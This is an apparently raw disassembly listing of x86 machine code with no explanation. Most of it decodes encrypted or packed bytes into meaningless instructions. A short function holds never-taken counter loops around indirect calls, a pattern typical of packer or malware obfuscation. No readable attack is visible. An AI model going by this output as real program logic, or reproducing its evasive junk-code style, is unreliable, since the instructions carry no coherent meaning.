  406a55:	popa   
  406a56:	push   ebp
  406a57:	in     al,0x75
  406a59:	jp     0x406ad5
  406a5b:	or     bl,dl
  406a5d:	inc    ecx
  406a5e:	dec    eax
  406a5f:	dec    edx
  406a60:	add    al,0xc1
  406a62:	jmp    0x8506:0xe4c97151
  406a69:	or     esi,ecx
  406a6b:	jae    0x406a11
  406a6d:	mov    al,0xb1
  406a6f:	jae    0x406a13
  406a71:	retf   0x2b30
  406a74:	mov    al,0x37
  406a76:	pop    ss
  406a77:	ficom  DWORD PTR [esi]
  406a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a7a:	mov    ecx,0x909909d7
  406a7f:	cs pop ss
  406a81:	cdq    
  406a82:	(bad)  
  406a83:	das    
  406a84:	shl    BYTE PTR [edi-0x65],1
  406a87:	scas   al,BYTE PTR es:[edi]
  406a88:	dec    ebp
  406a89:	pop    edx
  406a8a:	je     0x406ace
  406a8c:	jge    0x406a1a
  406a8e:	out    0x51,eax
  406a90:	sti    
  406a91:	sbb    DWORD PTR [esi+0x1e35b08e],0xffffff85
  406a98:	inc    edi
  406a99:	lahf   
  406a9a:	out    dx,eax
  406a9b:	cmp    edx,esp
  406a9d:	xor    DWORD PTR [esi+0x2ce57323],edi
  406aa3:	adc    al,0xd7
  406aa5:	test   DWORD PTR [eax],edi
  406aa7:	cwde   
  406aa8:	sub    al,0xe3
  406aab:	lahf   
  406aac:	test   eax,0xf1391765
  406ab1:	aad    0xaf
  406ab3:	push   esi
  406ab4:	jne    0x406af7
  406ab6:	jg     0x406b2f
  406ab8:	fimul  WORD PTR [esi-0x6aaf809c]
  406abe:	mov    dl,BYTE PTR [ebx+esi*1]
  406ac1:	rol    DWORD PTR ds:0x32729c,0xc9
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e77b,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd81,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fd59
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e76f,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fd59
  406b20:	and    esi,DWORD PTR ds:0x42e1a8
  406b26:	mov    DWORD PTR ds:0x42fd59,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e773,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e773,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e773,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e35f
  406b61:	mov    edi,DWORD PTR ds:0x42e773
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e773,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fd71,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fd71,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fd71,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fd7d
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e5bf
  406bad:	mov    edi,DWORD PTR ds:0x42fd71
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fd71,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fd65,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fd65
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fd65,edi
  406bdb:	cmp    DWORD PTR ds:0x42fd65,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fd65,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fd6d
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e4db
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fdf6,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fdf6
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fdf6,edi
  406c22:	cmp    DWORD PTR ds:0x42fdf6,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e787
  406c34:	push   0x42e224
  406c39:	call   DWORD PTR ds:0x42e5c3
  406c3f:	cmp    DWORD PTR ds:0x42fdf6,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fdf6
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fdf6,edi
  406c59:	cmp    DWORD PTR ds:0x42fdf6,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e793,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e78b,0x42fdf6
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x4d
  406c9b:	xchg   esp,eax
  406c9c:	jmp    0x406cea
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c55
  406ca7:	add    ch,ch
  406ca9:	push   0xa4b6b3d9
  406cae:	in     al,dx
  406caf:	ins    BYTE PTR es:[edi],dx
  406cb0:	(bad)  
  406cb1:	lock jp 0x406cf8
  406cb4:	pusha  
  406cb5:	sub    bl,dh
  406cb7:	cs mov cl,0xda
  406cba:	inc    edx
  406cbb:	or     dl,BYTE PTR [esp+ebp*8+0x34]
  406cbf:	xchg   DWORD PTR [esi],ebp
  406cc1:	enter  0x8cd7,0x54
  406cc5:	cld    
  406cc6:	popf   
  406cc7:	aam    0xcd
  406cc9:	add    BYTE PTR [edx-0x9],bh
  406ccc:	icebp  
  406ccd:	mov    edi,0xf8111aa0
  406cd2:	dec    edx
  406cd3:	stc    
  406cd4:	and    edi,DWORD PTR [eax-0x4e]
  406cd7:	xor    eax,0x6dca6d8
  406cdc:	mov    al,0xfa
  406cde:	push   ebx
  406cdf:	xor    eax,0x7587ac5
  406ce4:	inc    ecx
  406ce5:	mov    esi,0x9cdaf4f4
  406cea:	add    edi,DWORD PTR [esi-0x39]
  406ced:	jp     0x406d06
  406cef:	cwde   
  406cf0:	jae    0x406ca9
  406cf2:	add    ebp,DWORD PTR [eax+0x1b5f15cf]
  406cf8:	adc    al,BYTE PTR [ebp-0x1f89c600]
  406cfe:	mov    ecx,0xb63820d8
  406d03:	jae    0x406ca0
  406d05:	xchg   BYTE PTR [ecx+edx*8],ah
  406d08:	xchg   edx,eax
  406d09:	(bad)  
  406d0a:	out    dx,al
  406d0b:	sub    edx,DWORD PTR [esi-0x78253c5b]
  406d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d12:	sti    
  406d13:	sbb    al,0x8b
  406d15:	push   ss
  406d16:	bound  esi,QWORD PTR [ecx]
  406d18:	je     0x406d2e
  406d1a:	dec    eax
  406d1b:	adc    DWORD PTR [ebp-0x23d49aa7],ebp
  406d21:	scas   eax,DWORD PTR es:[edi]
  406d22:	into   
  406d23:	fiadd  WORD PTR ds:0x92d5ab0
  406d29:	cmp    esi,DWORD PTR [esi]
  406d2b:	push   ebp
  406d2c:	mov    ah,0xe2
  406d2e:	(bad)  
  406d30:	xor    ebx,esp
  406d32:	icebp  
  406d33:	pop    ebp
  406d34:	sub    ah,al
  406d36:	scas   al,BYTE PTR es:[edi]
  406d37:	dec    ebp
  406d38:	arpl   WORD PTR [esi+0x446bd5b5],ax
  406d3e:	adc    ah,BYTE PTR [esi]
  406d40:	jbe    0x406d1d
  406d42:	cmc    
  406d43:	ins    BYTE PTR es:[edi],dx
  406d44:	pop    es
  406d45:	test   DWORD PTR [edi],0x8b00aba8
  406d4b:	xor    DWORD PTR [eax],ecx
  406d4d:	ja     0x406d61
  406d4f:	jnp    0x406d24
  406d51:	mov    ch,0xbb
  406d53:	jno    0x406d43
  406d55:	sub    al,0x37
  406d57:	nop
  406d58:	sbb    al,0x71
  406d5a:	jp     0x406d0f
  406d5c:	ss add dh,dl
  406d5f:	outs   dx,DWORD PTR ds:[esi]
  406d60:	cli    
  406d61:	cmp    DWORD PTR [edi-0x2c],esi
  406d64:	outs   dx,DWORD PTR ds:[esi]
  406d65:	pop    ebx
  406d66:	dec    edi
  406d67:	mov    edi,0x7963bb3a
  406d6c:	mov    edi,0xc8b9037e
  406d71:	xchg   esi,eax
  406d72:	in     eax,0xb8
  406d74:	dec    esi
  406d75:	shr    DWORD PTR [ebx-0x6],cl
  406d78:	mov    ebx,0xb3b73c2c
  406d7d:	cdq    
  406d7e:	xchg   DWORD PTR [edi+0x2c],eax
  406d81:	(bad)  
  406d82:	ds stos DWORD PTR es:[edi],eax
  406d84:	aad    0x21
  406d86:	outs   dx,DWORD PTR ds:[esi]
  406d87:	fistp  QWORD PTR [eax+0x1c]
  406d8a:	bound  esp,QWORD PTR [ebx+0xe]
  406d8d:	pop    esp
  406d8e:	or     eax,0x1515a848
  406d93:	and    BYTE PTR [eax+0x46],0x98
  406d97:	pop    eax
  406d98:	mov    cl,0x49
  406d9a:	or     dl,dh
  406d9c:	cmp    edi,DWORD PTR [ebx+0x6b]
  406d9f:	xor    al,0xb8
  406da1:	stos   BYTE PTR es:[edi],al
  406da2:	cmp    ecx,DWORD PTR [eax+0x71]
  406da5:	idiv   bl
  406da7:	mov    ecx,0x2f56212f
  406dac:	adc    cl,dl
  406dae:	adc    al,0xe8
  406db0:	xor    BYTE PTR [ebx-0x2da665cc],0xd4
  406db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406db8:	mov    esi,0x4a6d4c42
  406dbd:	stos   DWORD PTR es:[edi],eax
  406dbe:	in     eax,0x5e
  406dc0:	sbb    al,0xa0
  406dc2:	adc    esi,edx
  406dc4:	test   al,0x3e
  406dc6:	jno    0x406d7d
  406dc8:	lods   eax,DWORD PTR ds:[esi]
  406dc9:	mov    dl,0xbc
  406dcb:	dec    esp
  406dcc:	in     eax,dx
  406dcd:	xchg   ebx,eax
  406dce:	loopne 0x406e30
  406dd0:	and    BYTE PTR [edx],dh
  406dd2:	xor    esi,DWORD PTR [esi+eax*8+0x4e5a6862]
  406dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dda:	dec    edx
  406ddb:	xchg   ebp,eax
  406ddc:	lea    esi,[esi-0x70f6e180]
  406de2:	xchg   esi,eax
  406de3:	mov    es,WORD PTR [esi-0x46acd2e]
  406de9:	adc    DWORD PTR [edx],ecx
  406deb:	add    eax,0xb8b4dd8f
  406df0:	jge    0x406daa
  406df2:	cs push 0x18
  406df5:	pop    ss
  406df6:	mov    ebp,0xb38f019d
  406dfb:	fiadd  DWORD PTR [eax-0x54]
  406dfe:	mov    edx,DWORD PTR [edx+0x38201d13]
  406e04:	fwait
  406e05:	or     ah,cl
  406e07:	jp     0x406e1b
  406e09:	loopne 0x406d90
  406e0b:	and    edx,DWORD PTR [esi]
  406e0d:	test   BYTE PTR [esi-0x6b689b98],dl
  406e13:	mov    ds:0x1d8e34f5,eax
  406e18:	push   ecx
  406e19:	add    eax,0x73741839
  406e1e:	mov    edx,ebx
  406e20:	inc    esi
  406e21:	xchg   edx,eax
  406e22:	dec    edx
  406e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e24:	mov    bh,cl
  406e26:	lahf   
  406e27:	popf   
  406e28:	fild   DWORD PTR [ecx]
  406e2a:	in     eax,0x57
  406e2c:	xlat   BYTE PTR ds:[ebx]
  406e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e2e:	cmc    
  406e2f:	add    DWORD PTR [eax],ebp
  406e31:	leave  
  406e32:	mov    al,fs:0xe82eb827
  406e38:	int    0x19
  406e3a:	mov    eax,ds:0x407eb4ad
  406e3f:	int3   
  406e40:	mov    ax,ss:0xc4f1adb3
  406e47:	jae    0x406dcb
  406e49:	lods   al,BYTE PTR ds:[esi]
  406e4a:	add    DWORD PTR [esi-0x10],esp
  406e4d:	mov    esp,0xf0a4c044
  406e52:	inc    esi
  406e53:	add    al,0xa0
  406e55:	xchg   ecx,eax
  406e56:	add    edx,edx
  406e58:	leave  
  406e59:	cld    
  406e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e5b:	mov    cl,0x8d
  406e5d:	test   al,0x2c
  406e5f:	fs stc 
  406e61:	add    al,0x8c
  406e63:	push   0xff031d6a
  406e68:	mov    eax,es:0x5009beed
  406e6e:	in     al,0xb3
  406e70:	push   edx
  406e71:	add    eax,DWORD PTR [ebp+0x5c]
  406e74:	ja     0x406e4e
  406e76:	dec    ebp
  406e77:	xor    BYTE PTR [edx],ah
  406e79:	loop   0x406e1d
  406e7b:	xor    eax,0x7a816faa
  406e80:	ins    BYTE PTR es:[edi],dx
  406e81:	daa    
  406e82:	jg     0x406e21
  406e84:	mov    esp,0x22071d8b
  406e89:	xor    eax,0x46d8cb7e
  406e8e:	inc    esi
  406e8f:	(bad)  
  406e90:	int    0x78
  406e92:	mov    esp,0x855102eb
  406e97:	cld    
  406e98:	test   BYTE PTR [esi+0x1908e144],ch
  406e9e:	mov    BYTE PTR [esi+0x4d],al
  406ea1:	cli    
  406ea2:	enter  0x8099,0xea
  406ea6:	mov    cl,0x2
  406ea8:	xor    eax,0x10a9d1d
  406ead:	jmp    0x406f0e
  406eaf:	pop    ds
  406eb0:	sbb    ah,BYTE PTR [eax]
  406eb2:	xor    edx,DWORD PTR [edi+0x46f1a2b1]
  406eb8:	rcr    BYTE PTR [ecx-0x31],cl
  406ebb:	mov    ebx,0x33de4e11
  406ec0:	dec    esp
  406ec1:	fcmovbe st,st(3)
  406ec3:	xor    DWORD PTR ds:0x3c9fcdbe,edx
  406ec9:	mov    ds:0x70deea95,eax
  406ece:	(bad)  [ebp+ebp*4-0x42]
  406ed2:	retf   
  406ed3:	pop    eax
  406ed4:	mov    esp,0xeed311e9
  406ed9:	cmp    eax,0x6fafb144
  406ede:	pop    ds
  406edf:	pop    esp
  406ee0:	hlt    
  406ee1:	inc    ebp
  406ee2:	fwait
  406ee3:	in     eax,0xb3
  406ee5:	push   ecx
  406ee6:	jecxz  0x406f0e
  406ee8:	mov    ds:0x54f407f4,eax
  406eed:	mov    edx,0xccf1bf50
  406ef2:	mov    BYTE PTR [ecx+0x14],al
  406ef5:	xchg   ebx,eax
  406ef6:	dec    ebp
  406ef7:	pop    eax
  406ef8:	iret   
  406ef9:	sahf   
  406efa:	popa   
  406efb:	inc    ebp
  406efc:	mov    DWORD PTR [edx-0x7b],esi
  406eff:	aaa    
  406f00:	adc    al,0x15
  406f02:	xchg   ebp,eax
  406f03:	in     al,dx
  406f04:	sbb    eax,0x72414443
  406f09:	mov    edi,0xd03a940b
  406f0e:	aam    0x7
  406f10:	push   ebx
  406f11:	push   eax
  406f12:	pop    ebp
  406f13:	dec    ecx
  406f14:	fdivp  st(1),st
  406f16:	in     eax,dx
  406f17:	sbb    al,BYTE PTR [esi]
  406f19:	add    eax,0x915c8b26
  406f1e:	push   es
  406f1f:	push   eax
  406f20:	jnp    0x406eb7
  406f22:	cmp    edi,DWORD PTR [ebx-0x80]
  406f25:	das    
  406f26:	rol    DWORD PTR [eax+0x64efb711],0x56
  406f2d:	inc    BYTE PTR [edx]
  406f2f:	rol    BYTE PTR [edi-0x1],cl
  406f32:	inc    ebp
  406f33:	clc    
  406f34:	loop   0x406f60
  406f36:	inc    edi
  406f37:	aaa    
  406f38:	cmp    DWORD PTR [esi-0x6239c111],eax
  406f3e:	sub    eax,0x267025d7
  406f43:	dec    edx
  406f44:	add    BYTE PTR [edx+0x794dd4f7],0x4c
  406f4b:	dec    eax
  406f4c:	leave  
  406f4d:	les    ebx,FWORD PTR [ecx-0x3f565537]
  406f53:	out    0x81,eax
  406f55:	mov    ebx,0xd96dd38a
  406f5a:	xchg   si,ax
  406f5c:	cmp    ebp,DWORD PTR [eax+0x5b]
  406f5f:	fsubr  QWORD PTR [esi+0x1b73a2a1]
  406f65:	dec    ebx
  406f66:	sub    esp,esp
  406f68:	(bad)  
  406f69:	repz pop es
  406f6b:	sar    al,1
  406f6d:	loopne 0x406f08
  406f6f:	push   ebp
  406f70:	test   ecx,eax
  406f72:	xor    edx,eax
  406f74:	xor    ecx,DWORD PTR [eax-0x6eeff488]
  406f7a:	mov    dh,0xe7
  406f7c:	fisub  WORD PTR [edx+0x6119b22]
  406f82:	loopne 0x406f35
  406f84:	push   0x2d81b4b9
  406f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f8a:	xor    edx,edx
  406f8c:	inc    esp
  406f8d:	cld    
  406f8e:	and    ebx,esi
  406f90:	lods   eax,DWORD PTR ds:[esi]
  406f91:	cmp    bh,BYTE PTR [esi+ebx*4]
  406f94:	fucompp 
  406f96:	add    eax,0xecb0aca4
  406f9b:	xchg   esi,ebx
  406f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f9e:	aam    0x72
  406fa0:	or     ebp,DWORD PTR [edx+0x1d82e949]
  406fa6:	int    0xd1
  406fa8:	or     BYTE PTR [edi],dl
  406faa:	jl     0x406f44
  406fac:	pop    ss
  406fad:	sbb    BYTE PTR [edx-0x3e],cl
  406fb0:	pusha  
  406fb1:	jmp    0xb7f9:0x5decce7b
  406fb8:	mov    DWORD PTR ds:0xf943d3a8,0x59c1786c
  406fc2:	inc    eax
  406fc4:	nop
  406fc5:	je     0x406f93
  406fc7:	ss mov edx,0xb6edd3fc
  406fcd:	nop
  406fce:	xor    ebp,0xc291112c
  406fd4:	test   DWORD PTR [ebp-0x39],edx
  406fd7:	inc    ebp
  406fd8:	int3   
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	repnz std 
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx-0x38ffbd19],cl
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [ecx-0x6a],di
  40700d:	(bad)  
  40700e:	in     eax,0xc7
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x406fd0
  407018:	jns    0x406fca
  40701a:	les    esi,FWORD PTR [edx+0x3a0bcf39]
  407020:	retf   
  407021:	adc    BYTE PTR [ebp-0x41],bh
  407024:	sbb    esp,ebp
  407026:	stc    
  407027:	test   eax,0xbec425f4
  40702c:	arpl   WORD PTR [ebx+0x11],cx
  40702f:	sar    DWORD PTR [ebx-0x43],cl
  407032:	sbb    DWORD PTR [ecx+0x53ff06c4],ebx
  407038:	mov    ecx,0xdfc620f4
  40703d:	jns    0x407039
  40703f:	lods   al,BYTE PTR ds:[esi]
  407040:	xor    DWORD PTR [ebx-0x13],ebx
  407043:	sbb    BYTE PTR [edi-0x5655612d],dl
  407049:	(bad)  
  40704c:	pop    edx
  40704d:	inc    edx
  40704e:	inc    ecx
  40704f:	inc    edi
  407050:	mov    ebp,0x88c6ad03
  407055:	mov    dl,0x3
  407057:	jb     0x407061
  407059:	xchg   esi,eax
  40705a:	dec    ebp
  40705b:	mov    WORD PTR [esi+0xfba1717],ss
  407061:	imul   ebx,DWORD PTR [ebp-0x200a8730],0x77
  407068:	adc    BYTE PTR [ebx-0x5c],cl
  40706b:	jno    0x407054
  40706d:	pop    es
  40706e:	sub    BYTE PTR [edi+0x41],al
  407071:	or     al,0x39
  407073:	cmp    BYTE PTR [ecx],bl
  407075:	int    0x67
  407077:	jmp    0x4ce:0xc6664155
  40707e:	adc    ebp,DWORD PTR [ebx-0x56]
  407081:	inc    eax
  407082:	xor    al,0xa8
  407084:	call   edi
  407086:	sti    
  407087:	fdiv   st,st(0)
  407089:	dec    ebp
  40708a:	pop    ebx
  40708b:	mov    ch,0x63
  40708d:	mov    ebx,0x926c413
  407092:	jbe    0x40705e
  407094:	dec    ebx
  407095:	cmp    cl,BYTE PTR [edx]
  407097:	push   ecx
  407098:	mov    al,ds:0xfe388e9e
  40709d:	jb     0x407105
  40709f:	xor    dl,bl
  4070a1:	ror    esp,1
  4070a3:	clc    
  4070a4:	mov    dh,0x65
  4070a6:	or     cl,BYTE PTR [eax+esi*8-0x6124a07f]
  4070ad:	sub    eax,0xcd309ccb
  4070b2:	call   0xae619113
  4070b7:	gs xchg ebx,eax
  4070b9:	inc    esi
  4070ba:	pop    ecx
  4070bb:	out    dx,eax
  4070bc:	adc    eax,0xcccd95f4
  4070c1:	(bad)
  4070c4:	add    al,0xc1
  4070c6:	js     0x4070b5
  4070c8:	and    eax,DWORD PTR [edi]
  4070ca:	or     cl,dl
  4070cc:	xor    al,0xcf
  4070ce:	inc    esi
  4070cf:	xchg   esp,eax
  4070d0:	add    eax,0xadb99cdb
  4070d5:	jp     0x40709e
  4070d7:	pop    edi
  4070d8:	lods   eax,DWORD PTR ds:[esi]
  4070d9:	cmp    ebx,ebp
  4070db:	mov    esp,0x2ebc7376
  4070e0:	loopne 0x407103
  4070e2:	inc    esp
  4070e3:	test   DWORD PTR [eax+0x2],esi
  4070e6:	xchg   esi,edx
  4070e8:	ror    BYTE PTR [esi-0x55],0x8
  4070ec:	jnp    0x4070d5
  4070ee:	mov    al,0xbb
  4070f0:	add    DWORD PTR [ecx-0x11c49b76],esi
  4070f6:	mov    dl,BYTE PTR [edi]
  4070f8:	dec    ebp
  4070f9:	mov    ebx,0xf4f45ef2
  4070fe:	das    
  4070ff:	and    BYTE PTR [eax+esi*8-0x50],bh
  407103:	push   ebx
  407104:	push   edi
  407105:	adc    DWORD PTR [edx+0x2d],ebp
  407108:	nop
  407109:	pop    eax
  40710a:	test   al,0xd6
  40710c:	jnp    0x407160
  40710e:	inc    edi
  40710f:	sub    BYTE PTR [ebx+eax*2],bl
  407112:	jb     0x4070fd
  407114:	daa    
  407115:	push   eax
  407116:	mov    dh,0x18
  407118:	cmp    ch,ch
  40711a:	mov    esp,0x8bc3ffa
  40711f:	jl     0x407162
  407121:	pop    edx
  407122:	inc    esp
  407123:	or     ch,BYTE PTR [ebp+0x19]
  407126:	push   edi
  407127:	js     0x407126
  407129:	xchg   edx,eax
  40712a:	xchg   ah,bh
  40712c:	les    eax,FWORD PTR [esi+0x60]
  40712f:	sbb    al,0xb1
  407131:	jge    0x4071a9
  407133:	push   ecx
  407134:	sbb    eax,0xac2b8639
  407139:	xchg   ecx,eax
  40713a:	mov    ch,0x3e
  40713c:	sub    eax,0x6baee488
  407141:	in     al,0xa4
  407143:	jns    0x407139
  407145:	lods   al,BYTE PTR ds:[esi]
  407146:	jne    0x4071a9
  407148:	jl     0x407119
  40714a:	cli    
  40714b:	rcl    DWORD PTR ds:0xfe1672be,cl
  407151:	mov    ds:0xe4910375,al
  407156:	stos   BYTE PTR es:[edi],al
  407157:	pop    ebx
  407158:	xsha1  (bad)
  407159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40715a:	mov    al,dl
  40715c:	les    edx,FWORD PTR [eax]
  40715e:	je     0x4070f1
  407160:	cli    
  407161:	sub    ebp,edi
  407163:	sub    al,cl
  407165:	shr    BYTE PTR [esi],1
  407167:	imul   edi,DWORD PTR [esi+eax*2+0xeb09049],0x351392f6
  407172:	jg     0x4071f3
  407174:	cli    
  407175:	sahf   
  407176:	push   esp
  407177:	popa   
  407178:	jmp    0x40715c
  40717a:	pop    eax
  40717b:	cmp    al,0x2a
  40717d:	pop    edi
  40717e:	leave  
  40717f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407180:	les    edx,FWORD PTR [ebx]
  407182:	xchg   BYTE PTR [edi],al
  407184:	shl    BYTE PTR [ebp-0x75b289e8],0x78
  40718b:	sub    edx,ecx
  40718d:	rcl    DWORD PTR [ecx-0x7b3ee7b2],cl
  407193:	(bad)  
  407194:	pop    ss
  407195:	(bad)  
  407196:	sbb    BYTE PTR [esi],dl
  407198:	in     eax,dx
  407199:	sbb    DWORD PTR [edx+0x5c],esi
  40719c:	inc    ebx
  40719d:	or     dl,BYTE PTR [ebp+0x1591293b]
  4071a3:	dec    esp
  4071a4:	lea    edx,[edx]
  4071a6:	mov    eax,ds:0xe6178f4a
  4071ab:	cli    
  4071ac:	jp     0x4071a5
  4071ae:	ror    edx,0xeb
  4071b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071b2:	jge    0x4071d6
  4071b4:	mov    bh,0x57
  4071b6:	outs   dx,BYTE PTR ds:[esi]
  4071b7:	test   eax,0x916a7efd
  4071bc:	mov    ebp,DWORD PTR [esi+0x368b52e6]
  4071c2:	push   esi
  4071c3:	or     eax,0xbfbb3a62
  4071c8:	int    0x81
  4071ca:	sbb    DWORD PTR [edx+0xd3554d9],edi
  4071d0:	les    esi,FWORD PTR [eax]
  4071d2:	push   ss
  4071d3:	inc    ecx
  4071d4:	(bad)  
  4071d5:	adc    ebx,DWORD PTR [eax]
  4071d7:	xchg   edi,eax
  4071d8:	cmp    cl,BYTE PTR [edx-0x5e2ad137]
  4071de:	ja     0x4071c6
  4071e0:	cwde   
  4071e1:	lea    edi,[esi]
  4071e3:	xchg   BYTE PTR [esi-0xb],dl
  4071e6:	push   0x45
  4071e8:	or     ch,BYTE PTR [edx+0x5da3e550]
  4071ee:	(bad)  [esi-0x2114b4f0]
  4071f4:	out    0xbc,al
  4071f6:	loop   0x4071c8
  4071f8:	jge    0x407181
  4071fa:	push   esp
  4071fb:	sub    dh,BYTE PTR [ecx]
  4071fd:	sahf   
  4071fe:	mov    edi,0x34cd889
  407203:	xchg   esi,eax
  407204:	fcmovnbe st,st(0)
  407206:	shr    DWORD PTR [edx],cl
  407208:	mov    ah,BYTE PTR [ebx]
  40720a:	mov    al,0x7a
  40720c:	lea    esi,[ebp+edx*8-0x252976dd]
  407213:	xchg   al,bh
  407215:	leave  
  407216:	and    bh,ch
  407218:	out    0x27,eax
  40721a:	inc    esi
  40721b:	add    esi,DWORD PTR [eax-0xa]
  40721e:	cmc    
  40721f:	in     eax,dx
  407220:	sub    dl,BYTE PTR [eax-0x76]
  407223:	mov    ecx,0x4c2cd398
  407228:	and    esp,esp
  40722a:	pop    es
  40722b:	inc    BYTE PTR [ebp+ebx*8-0x15]
  40722f:	out    dx,eax
  407230:	(bad)  
  407231:	out    dx,al
  407232:	dec    esp
  407233:	xlat   BYTE PTR ds:[ebx]
  407234:	adc    BYTE PTR [ebp+0x13c59983],bl
  40723a:	sahf   
  40723b:	mov    esi,0xe1c6f757
  407240:	fmul   DWORD PTR [ebx-0x6078187a]
  407246:	rcr    DWORD PTR [edx-0x262af666],cl
  40724c:	or     al,0xf6
  40724e:	ret    
  40724f:	in     eax,0xbc
  407251:	sahf   
  407252:	ficom  WORD PTR [edx]
  407254:	(bad)  
  407255:	push   edx
  407256:	mul    DWORD PTR [ebx+esi*4]
  407259:	push   es
  40725a:	adc    eax,0xfca067c4
  40725f:	mov    dl,0xa7
  407261:	sub    eax,0x5cf738c8
  407266:	jns    0x40726b
  407268:	sub    eax,ebx
  40726a:	jae    0x40727e
  40726c:	out    0xb,al
  40726e:	data16 (bad) 
  407270:	imul   eax,edx,0x64af0d84
  407276:	dec    esp
  407277:	mov    ch,0x2e
  407279:	cmp    BYTE PTR [edx+eax*4],ch
  40727c:	push   ebx
  40727d:	push   eax
  40727e:	into   
  40727f:	aad    0xe1
  407281:	or     esp,DWORD PTR [edi+0x16]
  407284:	fcmovnbe st,st(7)
  407286:	push   eax
  407287:	pop    ebp
  407288:	mov    eax,0x676df798
  40728d:	aas    
  40728e:	jo     0x40727e
  407290:	mov    bh,BYTE PTR [edx+edi*4-0x1384c0b3]
  407297:	les    ebp,FWORD PTR [eax]
  407299:	inc    esi
  40729a:	mov    ?,WORD PTR [esi+0x37b9f261]
  4072a0:	cmp    DWORD PTR [ebx-0x65bc0f06],edi
  4072a6:	(bad)  
  4072a7:	stc    
  4072a8:	adc    DWORD PTR [eax-0x66],edi
  4072ab:	test   eax,0x2171ba1
  4072b0:	mov    edx,0x206bee12
  4072b5:	fld    QWORD PTR [edx]
  4072b7:	pop    edx
  4072b8:	jl     0x4072a2
  4072ba:	(bad)  
  4072bb:	cli    
  4072bc:	push   ebx
  4072bd:	or     edx,ecx
